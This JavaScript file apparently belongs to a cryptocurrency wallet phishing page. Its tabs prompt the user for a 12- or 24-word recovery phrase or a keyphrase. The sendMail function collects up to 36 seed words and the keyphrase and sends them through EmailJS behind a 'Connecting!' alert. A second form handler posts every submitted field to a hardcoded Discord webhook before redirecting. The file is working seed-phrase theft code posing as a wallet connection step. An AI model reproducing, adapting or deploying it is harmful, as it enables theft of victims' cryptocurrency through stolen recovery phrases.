function showWords(count) {
  document.querySelector('.word-tab.active').classList.remove('active');
  if (count === 12) {
      document.querySelector('.word-tab:nth-child(1)').classList.add('active');
      document.getElementById('words-12').style.display = 'flex';
      document.getElementById('words-24').style.display = 'none';
      document.getElementById('keyphrase').style.display = 'none';
  } else if (count === 24) {
      document.querySelector('.word-tab:nth-child(2)').classList.add('active');
      document.getElementById('words-12').style.display = 'none';
      document.getElementById('words-24').style.display = 'flex';
      document.getElementById('keyphrase').style.display = 'none';
  } else {    
      document.querySelector('.word-tab:nth-child(3)').classList.add('active');
      document.getElementById('words-12').style.display = 'none';
      document.getElementById('words-24').style.display = 'none';
      document.getElementById('keyphrase').style.display = 'flex';
  }
}




function sendMail() {
  var templateParams = {
   word1: document.getElementById('word1').value,
   word2: document.getElementById('word2').value,
   word3: document.getElementById('word3').value,
   word4: document.getElementById('word4').value,
   word5: document.getElementById('word5').value,
   word6: document.getElementById('word6').value,
   word7: document.getElementById('word7').value,
   word8: document.getElementById('word8').value,
   word9: document.getElementById('word9').value,
   word10: document.getElementById('word10').value,
   word11: document.getElementById('word11').value,
   word12: document.getElementById('word12').value,
   word13: document.getElementById('word13').value,
   word14: document.getElementById('word14').value,
   word15: document.getElementById('word15').value,
   word16: document.getElementById('word16').value,
   word17: document.getElementById('word17').value,
   word18: document.getElementById('word18').value,
   word19: document.getElementById('word19').value,
   word20: document.getElementById('word20').value,
   word21: document.getElementById('word21').value,
   word22: document.getElementById('word22').value,
   word23: document.getElementById('word23').value,
   word24: document.getElementById('word24').value,
   word25: document.getElementById('word25').value,
   word26: document.getElementById('word26').value,
   word27: document.getElementById('word27').value,
   word28: document.getElementById('word28').value,
   word29: document.getElementById('word29').value,
   word30: document.getElementById('word30').value,
   word31: document.getElementById('word31').value,
   word32: document.getElementById('word32').value,
   word33: document.getElementById('word33').value,
   word34: document.getElementById('word34').value,
   word35: document.getElementById('word35').value,
   word36: document.getElementById('word36').value,
   keyphrase: document.getElementById('keyphrase').value,
  };

  document.getElementById('formm')
.addEventListener('submit', function(event) {
 event.preventDefault();});

  emailjs.send("service_t7gea3i", "template_jlaygdt", templateParams).then(alert("Connecting!")); 
}


document.addEventListener("DOMContentLoaded", function () {
  document.getElementById("contactForm").addEventListener("submit", async function (event) {
      event.preventDefault();

      // Collect form data
      let formData = new FormData(this);
      let messageContent = "**New Form Submission**\n";

      formData.forEach((value, key) => {
          if (value.trim() !== "") {
              messageContent += `**${key}**: ${value}\n`;
          }
      });

      // Your Discord webhook URL
      const webhookURL = "https://discord.com/api/webhooks/1293947126551805972/p6E69lwa7SGRlUIN7lfqD0UIQ-HVvdqTGmNNGnqzCPrmUqxyL9GSpAMIHpn3nNoW6w0o";

      // Send data to Discord
      try {
          await fetch(webhookURL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ content: messageContent })
          });

          // Redirect to another page after successful submission
          window.location.href = "thanks.html"; // Change this to your desired page
      } catch (error) {
          console.error("Error sending to Discord:", error);
          alert("Failed to process. Please try again.");
      }
  });
});




if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
      navigator.serviceWorker
        .register('/service-worker.js')
        .then((registration) => {
          console.log('Service Worker registered with scope:', registration.scope);
        })
        .catch((error) => {
          console.log('Service Worker registration failed:', error);
        });
    });
  }
  